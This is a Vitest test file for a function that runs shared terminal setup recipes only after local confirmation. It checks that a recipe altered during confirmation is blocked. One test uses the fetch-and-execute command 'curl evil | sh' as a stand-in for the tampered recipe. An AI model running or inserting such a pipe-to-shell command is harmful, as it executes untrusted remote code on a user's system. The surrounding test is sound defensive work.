// @vitest-environment jsdom
import { beforeEach, describe, expect, it, vi } from "vitest";
import type { TerminalRecipe } from "@shared/types/project";

const dispatch = vi.hoisted(() => vi.fn(async () => ({ ok: true })));
const recipes = vi.hoisted(() => ({ list: [] as TerminalRecipe[] }));

vi.mock("@/services/ActionService", () => ({ actionService: { dispatch } }));
vi.mock("@/store/recipeStore", () => ({
  useRecipeStore: {
    getState: () => ({
      currentProjectId: "p1",
      isLoading: false,
      getRecipeById: (id: string) => recipes.list.find((recipe) => recipe.id === id),
    }),
    subscribe: () => () => {},
  },
}));

import { runPendingHostSetup } from "../pendingHostSetup";

const RECIPE: TerminalRecipe = {
  id: "setup",
  name: "Install dependencies",
  terminals: [{ type: "terminal", command: "npm install" }],
  createdAt: 0,
} as TerminalRecipe;

beforeEach(() => {
  dispatch.mockClear();
  recipes.list = [RECIPE];
  Object.assign(window, {
    electron: {
      projectMatch: {
        takePendingSetup: vi.fn(async () => ({ recipeId: "setup", worktreePath: null })),
      },
    },
  });
});

describe("runPendingHostSetup", () => {
  it("runs a recipe from another machine only after the person here has seen it", async () => {
    const confirm = vi.fn(async () => false);
    await runPendingHostSetup("p1", confirm);
    expect(confirm).toHaveBeenCalledWith(RECIPE);
    expect(dispatch).not.toHaveBeenCalled();

    confirm.mockResolvedValue(true);
    await runPendingHostSetup("p1", confirm);
    expect(dispatch).toHaveBeenCalledWith("recipe.run", { recipeId: "setup" }, { source: "user" });
  });

  it("asks nothing and runs nothing when the recipe isn't in the cloned project", async () => {
    recipes.list = [];
    const confirm = vi.fn(async () => true);
    await runPendingHostSetup("p1", confirm);
    expect(confirm).not.toHaveBeenCalled();
    expect(dispatch).not.toHaveBeenCalled();
  });

  it("runs nothing when the recipe changed while the person was looking at it", async () => {
    const confirm = vi.fn(async () => {
      recipes.list = [{ ...RECIPE, terminals: [{ type: "terminal", command: "curl evil | sh" }] }];
      return true;
    });
    await runPendingHostSetup("p1", confirm);
    expect(confirm).toHaveBeenCalled();
    expect(dispatch).not.toHaveBeenCalled();
  });
});
